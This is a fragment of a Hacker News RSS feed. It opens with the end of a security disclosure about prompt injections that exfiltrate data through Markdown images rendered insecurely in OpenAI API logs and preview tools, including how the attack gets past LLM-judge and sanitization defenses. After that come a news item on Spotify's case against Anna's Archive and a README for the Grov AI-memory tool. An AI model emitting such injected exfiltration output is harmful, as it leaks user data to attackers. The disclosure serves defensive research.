    &lt;head rend="h3"&gt;Attacking Systems with Alternative Image Defenses&lt;/head&gt;
    &lt;p&gt;In the attack chain above, the malicious response containing a Markdown image was blocked by an LLM as a judge. But, there are many other defenses that can be used to prevent Markdown images from rendering (which can protect the user until the insecure API log is opened).&lt;/p&gt;
    &lt;p&gt;These defenses include:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Content security policies&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Programmatic sanitization of Markdown images from AI output&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;AI outputs not being rendered using Markdown in the AI app; plain text only&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Apps that use these defenses can still be impacted. As an example, one common feedback mechanism is the thumbs-up / thumbs-down in chat. Usually, responses that encounter a prompt injection result in malformed or manipulated output. If a user selects √¢thumbs down√¢ on that response, it will be flagged for review, allowing for the attack chain to occur in the OpenAI Logs.&lt;/p&gt;
    &lt;p&gt;Here we can see Perplexity, which uses thumbs-up/thumbs-down feedback. Below is a Perplexity response that was programmatically sanitized, stripping a Markdown image. It leaves an odd, empty response, to which a user may reasonably react with √¢thumbs down√¢.&lt;/p&gt;
    &lt;p&gt;If a developer goes to review this, they may be affected by the same attack chain described above.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Complete Attack Surface&lt;/head&gt;
    &lt;p&gt;Insecure Markdown rendering has been identified in the logs for the √¢responses√¢ and √¢conversations√¢ APIs. As mentioned, systems built using these APIs include:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Agent Builder&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Assistants&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;AI features from vendors that list OpenAI as a subprocessor (since Responses is the default API for building AI features).&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Additionally, the preview interfaces used to test AI tools being developed in the OpenAI platform also exhibited insecure Markdown image rendering (meaning that a prompt injection could exfiltrate data when anyone is testing their systems). This includes:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Create Chat&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Create Assistant&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;and Agent Builder.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Similarly, the Starter ChatKit App, ChatKit Playground, and Widget Builder (used by developers to get off the ground while building AI apps) lack defenses against insecure image rendering.&lt;/p&gt;
    &lt;head rend="h3"&gt;Responsible Disclosure&lt;/head&gt;
    &lt;p&gt;Given the varied ways in which prompt injections can exploit systems, triaging prompt injection vulnerabilities is challenging √¢ they are often difficult to classify under existing vulnerability taxonomies. After coordination with triagers, this report was determined to be 'Not Applicable' for the OpenAI BugCrowd program.&lt;/p&gt;
    &lt;p&gt;Nov 17, 2025 Initial report submitted&lt;lb/&gt;Nov 20, 2025 Reproducible step-by-step provided&lt;lb/&gt;Nov 24, 2025 Clarification questions answered&lt;lb/&gt;Nov 25, 2025 Clarification questions answered&lt;lb/&gt;Nov 26, 2025 Clarification questions answered&lt;lb/&gt;Dec 04, 2025 Report closed as 'Non-Applicable' &lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46710569</guid><pubDate>Wed, 21 Jan 2026 19:45:21 +0000</pubDate></item><item><title>Spotify won court order against Anna's Archive, taking down .org domain</title><link>https://arstechnica.com/tech-policy/2026/01/annas-archive-said-spotify-scrape-didnt-cause-domain-suspension-it-was-wrong/</link><description>&lt;doc fingerprint="a0862354d75930c9"&gt;
  &lt;main&gt;
    &lt;p&gt;When shadow library Anna‚Äôs Archive lost its .org domain in early January, the controversial site‚Äôs operator said the suspension didn‚Äôt appear to have anything to do with its recent mass scraping of Spotify.&lt;/p&gt;
    &lt;p&gt;But it turns out, probably not surprisingly to most people, that the domain suspension resulted from a lawsuit filed by Spotify, along with major record labels Sony, Warner, and Universal Music Group (UMG). The music companies sued Anna‚Äôs Archive in late December in US District Court for the Southern District of New York, and the case was initially sealed.&lt;/p&gt;
    &lt;p&gt;A judge ordered the case unsealed on January 16 ‚Äúbecause the purpose for which sealing was ordered has been fulfilled.‚Äù Numerous documents were made public on the court docket yesterday, and they explain events around the domain suspension.&lt;/p&gt;
    &lt;p&gt;On January 2, the music companies asked for a temporary restraining order, and the court granted it the same day. The order imposed requirements on the Public Interest Registry (PIR), a US-based nonprofit that oversees .org domains, and Cloudflare.&lt;/p&gt;
    &lt;p&gt;‚ÄúTogether, PIR and Cloudflare have the power to shut off access to the three web domains that Anna‚Äôs Archive uses to unlawfully distribute copyrighted works,‚Äù the music companies told the court. They asked the court to issue ‚Äúa temporary restraining order requiring that Anna‚Äôs Archive immediately cease and desist from all reproduction or distribution of the Record Company Plaintiffs‚Äô copyrighted works,‚Äù and to ‚Äúexercise its power under the All Writs Act to direct PIR and Cloudflare to facilitate enforcement of that order.‚Äù&lt;/p&gt;
    &lt;head rend="h2"&gt;Anna‚Äôs Archive notified of case after suspension&lt;/head&gt;
    &lt;p&gt;The companies further asked that Anna‚Äôs Archive receive notice of the case by email only after the ‚Äúorder is issued by the Court and implemented by PIR and Cloudflare, to prevent Anna‚Äôs Archive from following through with its plan to release millions of illegally obtained, copyrighted sound recordings to the public.‚Äù That is apparently what happened, given that the operator of Anna‚Äôs Archive initially said domain suspensions are just something that ‚Äúunfortunately happens to shadow libraries on a regular basis,‚Äù and that ‚Äúwe don‚Äôt believe this has to do with our Spotify backup.‚Äù&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46711380</guid><pubDate>Wed, 21 Jan 2026 20:52:00 +0000</pubDate></item><item><title>Show HN: TerabyteDeals ‚Äì Compare storage prices by $/TB</title><link>https://terabytedeals.com</link><guid isPermaLink="false">https://news.ycombinator.com/item?id=46711649</guid><pubDate>Wed, 21 Jan 2026 21:13:59 +0000</pubDate></item><item><title>Jerry (YC S17) Is Hiring</title><link>https://www.ycombinator.com/companies/jerry-inc/jobs/QaoK3rw-software-engineer-core-automation-marketplace</link><guid isPermaLink="false">https://news.ycombinator.com/item?id=46711792</guid><pubDate>Wed, 21 Jan 2026 21:26:18 +0000</pubDate></item><item><title>Show HN: Grov ‚Äì Multiplayer for AI coding agents</title><link>https://github.com/TonyStef/Grov</link><description>&lt;doc fingerprint="be5dcb1c2d83c86a"&gt;
  &lt;main&gt;
    &lt;p&gt;Collective AI memory for engineering teams.&lt;/p&gt;
    &lt;p&gt;When one dev's AI figures something out, every dev's AI knows it.&lt;/p&gt;
    &lt;p&gt;Website ‚Ä¢ Dashboard ‚Ä¢ Quick Start ‚Ä¢ Features ‚Ä¢ Contributing&lt;/p&gt;
    &lt;p&gt;Your team's AI agents are learning in silos.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Dev A's Claude spends 10 minutes understanding your auth system&lt;/item&gt;
      &lt;item&gt;Dev B's Claude does the exact same exploration the next day&lt;/item&gt;
      &lt;item&gt;Dev C asks a question that was already answered last week&lt;/item&gt;
      &lt;item&gt;Every new session starts from zero&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The waste: Redundant exploration, duplicate token spend, knowledge that disappears when sessions end.&lt;/p&gt;
    &lt;p&gt;Grov captures what your team's AI learns and shares it automatically.&lt;/p&gt;
    &lt;code&gt;Dev A: "How does auth work in this codebase?"
        ‚Üì
     Claude investigates, figures it out
        ‚Üì
     Grov captures the reasoning + decisions
        ‚Üì
     Syncs to team dashboard
        ‚Üì
Dev B: "Should we add password salting?"
        ‚Üì
     Claude already knows: "Based on verified team knowledge,
     no - this codebase uses OAuth-only, no passwords stored"
        ‚Üì
     No exploration needed. Instant expert answer.
&lt;/code&gt;
    &lt;p&gt;Measured impact: Tasks drop from 10+ minutes to 1-2 minutes when team context is available.&lt;/p&gt;
    &lt;code&gt;npm install -g grov   # Install
grov init             # Configure (one-time)
grov proxy            # Start (keep running)&lt;/code&gt;
    &lt;p&gt;Then use Claude Code normally in another terminal. That's it.&lt;/p&gt;
    &lt;code&gt;grov setup              # Interactive setup (Cursor, Zed, Codex)
grov init cursor        # Direct setup for Cursor CLI
grov init antigravity   # Direct setup for Antigravity&lt;/code&gt;
    &lt;quote&gt;
      &lt;p&gt;IDE integrations (Cursor, Zed, Antigravity) use native MCP - no proxy needed.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;quote&gt;&lt;p&gt;Important: Your&lt;/p&gt;&lt;code&gt;ANTHROPIC_API_KEY&lt;/code&gt;must be set permanently in your shell profile, not just with&lt;code&gt;export&lt;/code&gt;in a terminal. See Troubleshooting for setup instructions.&lt;/quote&gt;
    &lt;p&gt;For team sync:&lt;/p&gt;
    &lt;code&gt;grov login                    # Authenticate via GitHub
grov sync --enable --team ID  # Enable sync for your team&lt;/code&gt;
    &lt;p&gt;Free for individuals and teams up to 3 developers.&lt;/p&gt;
    &lt;p&gt;Real reasoning, not just file lists:&lt;/p&gt;
    &lt;p&gt;Architectural decisions, patterns, and rationale - automatically extracted and synced to your team.&lt;/p&gt;
    &lt;p&gt;Every captured memory includes:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Reasoning trace - The WHY behind decisions (CONCLUSION/INSIGHT pairs)&lt;/item&gt;
      &lt;item&gt;Key decisions - What was chosen and why alternatives were rejected&lt;/item&gt;
      &lt;item&gt;Files touched - Which parts of the codebase are relevant&lt;/item&gt;
      &lt;item&gt;Constraints discovered - What can't break, what must stay compatible&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;When a teammate asks a related question, Claude already knows:&lt;/p&gt;
    &lt;p&gt;No exploration. No re-investigation. Instant expert answers from team memory.&lt;/p&gt;
    &lt;p&gt;Claude receives verified context and skips the exploration phase entirely - no "let me investigate" or "I'll need to look at the codebase."&lt;/p&gt;
    &lt;p&gt;The core value: what one dev's AI learns, everyone's AI knows.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Automatic capture - Reasoning extracted when tasks complete&lt;/item&gt;
      &lt;item&gt;Automatic sync - Memories sync to your team in real-time&lt;/item&gt;
      &lt;item&gt;Automatic injection - Relevant context injected into new sessions&lt;/item&gt;
      &lt;item&gt;Hybrid search - Semantic (AI understands meaning) + lexical (keyword matching)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Grov monitors what Claude does (not what you ask) and corrects when it goes off-track.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Extracts your intent from the first prompt&lt;/item&gt;
      &lt;item&gt;Monitors Claude's actions (file edits, commands, explorations)&lt;/item&gt;
      &lt;item&gt;Scores alignment (1-10) using Claude Haiku&lt;/item&gt;
      &lt;item&gt;Injects corrections at 4 levels: nudge ‚Üí correct ‚Üí intervene ‚Üí halt&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;# Test drift detection
grov drift-test "refactor the auth system" --goal "fix login bug"&lt;/code&gt;
    &lt;p&gt;Anthropic's prompt cache expires after 5 minutes of inactivity. Grov keeps it warm.&lt;/p&gt;
    &lt;code&gt;grov proxy --extended-cache&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Sends minimal keep-alive requests (~$0.002 each) during idle periods&lt;/item&gt;
      &lt;item&gt;Saves ~$0.18 per idle period by avoiding cache recreation&lt;/item&gt;
      &lt;item&gt;Your next prompt is faster and cheaper&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Opt-in only. By using &lt;code&gt;--extended-cache&lt;/code&gt;, you consent to Grov making API requests on your behalf.&lt;/p&gt;
    &lt;p&gt;When your context window fills up, Grov automatically compacts while preserving what matters.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Pre-computes summary at 85% capacity&lt;/item&gt;
      &lt;item&gt;Preserves: original goal, key decisions with reasoning, current state, next steps&lt;/item&gt;
      &lt;item&gt;Drops: verbose exploration, redundant file reads, superseded reasoning&lt;/item&gt;
      &lt;item&gt;Claude continues seamlessly without losing important context&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;No manual &lt;code&gt;/compact&lt;/code&gt; needed. No lost reasoning.&lt;/p&gt;
    &lt;code&gt;# Setup
grov init             # Configure for Claude Code (proxy mode)
grov init cursor      # Configure for Cursor CLI
grov init antigravity # Configure for Antigravity
grov setup            # Interactive setup (Cursor, Zed, Codex)

# Proxy (CLI tools only)
grov proxy            # Start the proxy
grov proxy-status     # Show active sessions

# Memory &amp;amp; Sync
grov status           # Show captured tasks
grov login            # Login to cloud dashboard
grov sync             # Sync memories to team dashboard

# Utilities
grov doctor           # Diagnose setup issues
grov disable          # Disable grov
grov uninstall        # Remove all grov data and config
grov drift-test       # Test drift detection&lt;/code&gt;
    &lt;code&gt;‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  Claude Code                                                ‚îÇ
‚îÇ       ‚îÇ                                                     ‚îÇ
‚îÇ       ‚ñº                                                     ‚îÇ
‚îÇ  Grov Proxy (localhost:8080)                                ‚îÇ
‚îÇ       ‚îÇ                                                     ‚îÇ
‚îÇ       ‚îú‚îÄ‚îÄ‚ñ∫ Inject team memory from past sessions            ‚îÇ
‚îÇ       ‚îú‚îÄ‚îÄ‚ñ∫ Forward to Anthropic API                         ‚îÇ
‚îÇ       ‚îú‚îÄ‚îÄ‚ñ∫ Monitor for drift, inject corrections            ‚îÇ
‚îÇ       ‚îú‚îÄ‚îÄ‚ñ∫ Track context usage, auto-compact if needed      ‚îÇ
‚îÇ       ‚îî‚îÄ‚îÄ‚ñ∫ Capture reasoning when task completes            ‚îÇ
‚îÇ                    ‚îÇ                                        ‚îÇ
‚îÇ                    ‚ñº                                        ‚îÇ
‚îÇ              Team Dashboard (app.grov.dev)                  ‚îÇ
‚îÇ                    ‚îÇ                                        ‚îÇ
‚îÇ                    ‚ñº                                        ‚îÇ
‚îÇ              Available to entire team                       ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
&lt;/code&gt;
    &lt;p&gt;Local by default: Memories stay on your machine in &lt;code&gt;~/.grov/memory.db&lt;/code&gt; (SQLite) unless you enable team sync.&lt;/p&gt;
    &lt;p&gt;Browse, search, and manage your team's AI knowledge at app.grov.dev.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Search across all sessions - Hybrid semantic + keyword search&lt;/item&gt;
      &lt;item&gt;Browse reasoning traces - See the WHY behind every decision&lt;/item&gt;
      &lt;item&gt;Team visibility - See who learned what, when&lt;/item&gt;
      &lt;item&gt;Invite teammates - Share knowledge automatically&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;# Required for memory sync and drift detection
export ANTHROPIC_API_KEY=sk-ant-...

# Optional
export GROV_DRIFT_MODEL=claude-sonnet-4-20250514  # Override model
export PROXY_HOST=127.0.0.1                        # Proxy host
export PROXY_PORT=8080                             # Proxy port&lt;/code&gt;
    &lt;p&gt;Without an API key, Grov uses basic extraction and memories will not sync.&lt;/p&gt;
    &lt;p&gt;Run &lt;code&gt;grov doctor&lt;/code&gt; to diagnose:&lt;/p&gt;
    &lt;code&gt;grov doctor&lt;/code&gt;
    &lt;p&gt;This checks your proxy, API key, login, sync status, and local database.&lt;/p&gt;
    &lt;p&gt;Using &lt;code&gt;export ANTHROPIC_API_KEY=...&lt;/code&gt; directly in terminal only works in THAT terminal session. When you open a new terminal, the key is gone.&lt;/p&gt;
    &lt;p&gt;Fix: Add the key to your shell profile so it persists:&lt;/p&gt;
    &lt;code&gt;# For zsh (macOS default):
echo 'export ANTHROPIC_API_KEY=sk-ant-...' &amp;gt;&amp;gt; ~/.zshrc
source ~/.zshrc

# For bash:
echo 'export ANTHROPIC_API_KEY=sk-ant-...' &amp;gt;&amp;gt; ~/.bashrc
source ~/.bashrc&lt;/code&gt;
    &lt;p&gt;Then run &lt;code&gt;grov doctor&lt;/code&gt; to verify:&lt;/p&gt;
    &lt;code&gt;‚úì ANTHROPIC_API_KEY: Set
&lt;/code&gt;
    &lt;p&gt;Get your API key at: https://console.anthropic.com/settings/keys&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Tool&lt;/cell&gt;
        &lt;cell role="head"&gt;Type&lt;/cell&gt;
        &lt;cell role="head"&gt;Proxy Required&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Claude Code&lt;/cell&gt;
        &lt;cell&gt;CLI&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Cursor&lt;/cell&gt;
        &lt;cell&gt;IDE&lt;/cell&gt;
        &lt;cell&gt;No (native MCP)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Cursor CLI&lt;/cell&gt;
        &lt;cell&gt;CLI&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Zed&lt;/cell&gt;
        &lt;cell&gt;IDE&lt;/cell&gt;
        &lt;cell&gt;No (native MCP)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Antigravity&lt;/cell&gt;
        &lt;cell&gt;IDE&lt;/cell&gt;
        &lt;cell&gt;No (native MCP)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Codex&lt;/cell&gt;
        &lt;cell&gt;CLI&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Coming soon: VS Code, Gemini CLI&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Node.js 18+&lt;/item&gt;
      &lt;item&gt;One of the supported tools above&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Free - Individuals and teams up to 3 developers&lt;/item&gt;
      &lt;item&gt;Team - Larger teams with additional features (coming soon)&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Local capture &amp;amp; inject&lt;/item&gt;
      &lt;item&gt;LLM-powered extraction&lt;/item&gt;
      &lt;item&gt;Local proxy with real-time monitoring&lt;/item&gt;
      &lt;item&gt;Anti-drift detection &amp;amp; correction&lt;/item&gt;
      &lt;item&gt;Team sync (cloud backend)&lt;/item&gt;
      &lt;item&gt;Web dashboard&lt;/item&gt;
      &lt;item&gt;Hybrid search (semantic + lexical)&lt;/item&gt;
      &lt;item&gt;Extended cache (keep prompt cache warm)&lt;/item&gt;
      &lt;item&gt;Auto-compaction with reasoning preservation&lt;/item&gt;
      &lt;item&gt;IDE integrations (Cursor, Zed, Antigravity)&lt;/item&gt;
      &lt;item&gt;VS Code extension&lt;/item&gt;
      &lt;item&gt;Gemini CLI support&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Fork the repo and clone locally&lt;/item&gt;
      &lt;item&gt;Install dependencies: &lt;code&gt;npm install&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Build: &lt;code&gt;npm run build&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Test locally: &lt;code&gt;node dist/cli.js --help&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;npm run dev              # Watch mode
node dist/cli.js init    # Test CLI&lt;/code&gt;
    &lt;p&gt;Found a bug? Open an issue.&lt;/p&gt;
    &lt;p&gt;Apache License 2.0 - see LICENSE file for details.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46711958</guid><pubDate>Wed, 21 Jan 2026 21:40:48 +0000</pubDate></item></channel></rss>